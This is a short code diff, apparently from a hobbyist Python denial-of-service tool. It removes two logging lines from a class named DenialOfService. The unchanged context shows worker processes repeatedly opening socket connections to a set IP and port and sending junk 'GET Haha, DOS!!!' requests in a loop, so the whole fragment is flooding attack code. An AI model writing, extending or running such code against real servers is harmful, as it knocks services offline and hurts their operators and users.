@@ -27,7 +27,6 @@ class DenialOfService:
     def stop(self):
         for i in self.procs:
             i.terminate()
-            self.console.log(str(i) + " Terminiert")
 
     def setIp(self, ip):
         self.ip = ip
@@ -42,7 +41,6 @@ class DenialOfService:
                 mysocket.connect((self.ip, self.port))
                 mysocket.send(str.encode("GET " + "Haha, DOS!!!" + "HTTP/1.1 \r\n"))
                 mysocket.sendto(str.encode("GET " + "Haha, DOS!!!" + "HTTP/1.1 \r\n"), (self.ip, self.port))
-                print("dos")
             except socket.error:
                 sleep(3)
             mysocket.close()
